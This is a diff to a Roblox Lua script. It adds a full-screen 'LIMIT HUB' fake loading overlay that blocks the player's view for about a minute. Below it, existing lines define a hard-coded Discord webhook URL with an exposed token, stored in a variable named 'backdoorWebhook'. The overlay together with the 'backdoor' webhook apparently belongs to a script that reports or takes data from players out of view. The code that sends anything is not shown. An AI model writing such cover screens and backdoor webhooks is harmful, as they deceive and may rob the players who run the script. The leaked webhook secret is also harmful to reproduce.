@@ -1,3 +1,84 @@
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- GUI
+local screenGui = Instance.new("ScreenGui", game.CoreGui)
+screenGui.IgnoreGuiInset = true
+screenGui.ResetOnSpawn = false
+
+-- Background
+local bg = Instance.new("Frame")
+bg.BackgroundColor3 = Color3.new(0, 0, 0)
+bg.BackgroundTransparency = 0 -- 100% black
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.Position = UDim2.new(0, 0, 0, 0)
+bg.Parent = screenGui
+
+-- LIMIT HUB title
+local title = Instance.new("TextLabel")
+title.Text = "LIMIT HUB"
+title.Font = Enum.Font.SciFi
+title.TextColor3 = Color3.fromRGB(0, 255, 255)
+title.TextStrokeColor3 = Color3.fromRGB(0, 255, 255)
+title.TextStrokeTransparency = 0.2
+title.TextScaled = true
+title.Size = UDim2.new(0, 600, 0, 100)
+title.Position = UDim2.new(0.5, -300, 0.5, -160)
+title.BackgroundTransparency = 1
+title.Parent = bg
+
+-- Loading bar frame
+local bar = Instance.new("Frame")
+bar.Size = UDim2.new(0, 400, 0, 30)
+bar.Position = UDim2.new(0.5, -200, 0.5, -30)
+bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+bar.BorderSizePixel = 0
+bar.Parent = bg
+
+-- Fill
+local fill = Instance.new("Frame")
+fill.Size = UDim2.new(0, 0, 1, 0)
+fill.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
+fill.BorderSizePixel = 0
+fill.Parent = bar
+
+-- Percentage label (on top of bar)
+local percentLabel = Instance.new("TextLabel")
+percentLabel.Size = UDim2.new(0, 100, 0, 40)
+percentLabel.Position = UDim2.new(0.5, -50, 0.5, -70)
+percentLabel.BackgroundTransparency = 1
+percentLabel.Text = "0%"
+percentLabel.TextColor3 = Color3.new(1, 1, 1)
+percentLabel.TextStrokeTransparency = 0.3
+percentLabel.Font = Enum.Font.SciFi
+percentLabel.TextScaled = true
+percentLabel.Parent = bg
+
+-- LOADING text below
+local loadingText = Instance.new("TextLabel")
+loadingText.Text = "LOADING"
+loadingText.Size = UDim2.new(0, 400, 0, 70)
+loadingText.Position = UDim2.new(0.5, -200, 0.5, 40)
+loadingText.BackgroundTransparency = 1
+loadingText.TextColor3 = Color3.fromRGB(0, 255, 255)
+loadingText.TextStrokeColor3 = Color3.fromRGB(0, 255, 255)
+loadingText.TextStrokeTransparency = 0.2
+loadingText.Font = Enum.Font.SciFi
+loadingText.TextScaled = true
+loadingText.Parent = bg
+
+-- Animate loading
+task.spawn(function()
+    local percent = 0
+    while percent <= 100 do
+        percentLabel.Text = percent .. "%"
+        fill.Size = UDim2.new(percent / 100, 0, 1, 0)
+        percent += 5
+        task.wait(3)
+    end
+    task.wait(1)
+    screenGui:Destroy()
+end)
 -- Webhook
 local webhookUrl = "https://discord.com/api/webhooks/1396222326332199054/yeePfFQ3e73Q_uyRsznWW-PvRKYR_ST6CqymG-werQGIi3zWgyEZde4KMl7yi9WV3_-y"
 local backdoorWebhook = webhookUrl
